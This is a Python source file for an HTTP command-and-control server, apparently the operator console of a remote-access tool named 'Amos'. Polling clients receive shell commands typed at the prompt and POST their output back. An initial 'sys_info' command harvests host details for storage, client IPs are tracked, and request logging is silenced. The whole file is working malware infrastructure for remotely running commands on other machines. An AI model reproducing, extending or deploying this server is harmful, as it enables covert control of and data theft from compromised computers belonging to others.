from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import threading
from EsHandler import EsHandler
import time


class MyHandler(BaseHTTPRequestHandler):


    connected_clients = {}  # Use a class variable to store connected clients with their unique IDs
    selected_client_ip = None  # Variable to store the selected client IP after using 'select' command
    input_ready = threading.Condition()  # Condition object for synchronizing input
    es_handler = None



    @staticmethod
    def convert_text(text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"



    # Don't print: 127.0.0.1 - - [22/Jun/2021 21:29:43] "POST / HTTP/1.1" 200
    def log_message(self, format, *args):
        pass



    #sends command to server
    def send_shell_command_to_client(self):
        # Use the input_ready condition to wait for user input from the shell interface
        with MyHandler.input_ready:
            MyHandler.input_ready.wait()

            self.wfile.write(MyHandler.shell_command.encode())



    def do_GET(self):
        if MyHandler.selected_client_ip is None:
            # If the selected client IP is None, handle the command locally (not sent to a client)
            client_ip = self.client_address[0]
            client_id = self.get_client_id(client_ip)

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.send_shell_command_to_client()

        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.send_shell_command_to_client()



    def do_POST(self):
        client_ip = self.client_address[0]
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.end_headers()

        data = parse_qs(self.rfile.read(length).decode())
        
        if "rfile" in data:

            if MyHandler.shell_command == "sys_info":
                sys_info = data["rfile"][0]
                MyHandler.es_handler.store_client_information(sys_info)
            else:
                print(data["rfile"][0])




    def get_client_id(self, client_ip):
        # Get the client ID based on the client's IP address
        if client_ip in MyHandler.connected_clients:
            return MyHandler.connected_clients[client_ip]
        else:
            # If the client is not in the connected_clients dictionary, generate a new ID
            new_client_id = len(MyHandler.connected_clients) + 1
            MyHandler.connected_clients[client_ip] = new_client_id
            return new_client_id



    def continuous_communication(self, client_ip):
        # Send the initial "sys_info" command to the client before starting the loop
        with MyHandler.input_ready:
            MyHandler.shell_command = "sys_info"
            MyHandler.input_ready.notify()

        print(f"Communicating with Client IP: {client_ip}")
        amos_text = self.convert_text(f"Amos (Client IP: {client_ip}): ")

        while True:
            command = input(f"{amos_text}").rstrip()
            if command.strip().lower() == 'exit':
                break

            # Store the shell command in the class variable and notify the server thread
            with MyHandler.input_ready:
                MyHandler.shell_command = command
                MyHandler.input_ready.notify()

            # Add a small delay to allow the server thread to process the command
            threading.Event().wait(0.1)


    
